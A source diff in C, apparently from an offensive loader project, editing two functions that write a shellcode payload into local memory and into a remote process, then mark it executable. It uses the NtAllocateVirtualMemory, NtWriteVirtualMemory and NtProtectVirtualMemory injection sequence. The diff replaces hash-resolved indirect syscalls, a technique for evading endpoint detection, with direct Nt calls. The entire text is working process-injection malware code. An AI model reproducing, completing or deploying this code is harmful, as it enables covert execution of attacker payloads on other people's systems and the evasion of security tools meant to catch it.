@@ -3,11 +3,10 @@
 BOOL WritePayloadInMemory(PVOID *pAddress, PBYTE pPayload, SIZE_T sPayloadSize) {
     DWORD dwOldProtection = 0;
 
-#ifdef HW_INDIRECT_SYSCALL
+#ifdef SYSCALL_ENABLED
 	NTSTATUS STATUS = STATUS_SUCCESS;
 
-	NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)PrepareSyscallHash(NtAllocateVirtualMemory_JOAA);
-	if ((STATUS = pNtAllocateVirtualMemory(GetCurrentProcess(), pAddress, 0, &sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0) {
+	if ((STATUS = NtAllocateVirtualMemory(GetCurrentProcess(), pAddress, 0, &sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0) {
 		DebugPrint("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
 		return FALSE;
 	}
@@ -15,8 +14,7 @@ BOOL WritePayloadInMemory(PVOID *pAddress, PBYTE pPayload, SIZE_T sPayloadSize) 
 	_memcpy(*pAddress, pPayload, sPayloadSize);
 	DebugPrint("[+] Payload written to memory at: 0x%p (%d bytes)\n", *pAddress, sPayloadSize);
 
-	NtProtectVirtualMemory_t pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)PrepareSyscallHash(NtProtectVirtualMemory_JOAA);
-	if ((STATUS = pNtProtectVirtualMemory(GetCurrentProcess(), pAddress, &sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) != 0) {
+	if ((STATUS = NtProtectVirtualMemory(GetCurrentProcess(), pAddress, &sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) != 0) {
 		DebugPrint("[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
 		VirtualFree(*pAddress, 0, MEM_RELEASE);
 		return FALSE;
@@ -50,25 +48,22 @@ BOOL WritePayloadInRemoteProcessMemory(IN HANDLE hProcess, IN PBYTE pShellcode, 
 	SIZE_T	sNumberOfBytesWritten = 0;
 	DWORD	dwOldProtection = 0;
 
-#ifdef HW_INDIRECT_SYSCALL
+#ifdef SYSCALL_ENABLED
 	NTSTATUS STATUS = STATUS_SUCCESS;
 
-	NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)PrepareSyscallHash(NtAllocateVirtualMemory_JOAA);
-	if ((STATUS = pNtAllocateVirtualMemory(hProcess, pAddress, 0, &sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0) {
+	if ((STATUS = NtAllocateVirtualMemory(hProcess, pAddress, 0, &sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0) {
 		DebugPrint("\t[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
 		return FALSE;
 	}
 	DebugPrint("\t[i] Allocated Memory At : 0x%p \n", pAddress);
 
-	NtWriteVirtualMemory_t pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)PrepareSyscallHash(NtWriteVirtualMemory_JOAA);
-	if ((STATUS = pNtWriteVirtualMemory(hProcess, *pAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten)) != 0) {
+	if ((STATUS = NtWriteVirtualMemory(hProcess, *pAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten)) != 0) {
 		DebugPrint("\t[!] NtWriteVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
 		return FALSE;
 	}
 	DebugPrint("\t[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);
 
-	NtProtectVirtualMemory_t pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)PrepareSyscallHash(NtProtectVirtualMemory_JOAA);
-	if ((STATUS = pNtProtectVirtualMemory(hProcess, pAddress, &sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtection)) != 0) {
+	if ((STATUS = NtProtectVirtualMemory(hProcess, pAddress, &sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtection)) != 0) {
 		DebugPrint("\t[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
 		return FALSE;
 	}
